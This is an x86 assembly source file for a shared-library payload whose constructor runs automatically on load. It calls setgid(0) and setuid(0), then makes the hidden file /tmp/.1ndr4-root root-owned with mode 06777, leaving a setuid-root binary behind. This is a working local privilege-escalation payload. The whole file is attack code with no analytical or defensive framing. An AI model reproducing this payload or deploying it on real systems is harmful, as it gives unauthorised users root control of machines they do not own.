	.text
.globl _init 
	.type _init, @function
_init:
	/* setgid(0) */
	xorl %ebx,%ebx
	movl %ebx,%eax
	movb $46,%al
	int $0x80
	/* setuid(0) */
	xorl %ebx,%ebx
	movl %ebx,%eax
	movb $23,%al
	int $0x80
	jmp getstring
rtn:
	/* chown("/tmp/.1ndr4-root", 0, 0) */
	pop %ebx
	push %ebx
	xorl %edx,%edx
	movl %edx,%ecx
	movl %edx,%eax
	movb $182,%al
	int $0x80
	/* chmod("/tmp/.1ndr4-root", 06777) */
	pop %ebx
	xorl %ecx,%ecx
	movl %ecx,%eax
	movw $0x0DFF, %cx 
	movb $15, %al
	int $0x80
	ret
getstring: call rtn
	.string "/tmp/.1ndr4-root"
	.section	.ctors
	.long	_init
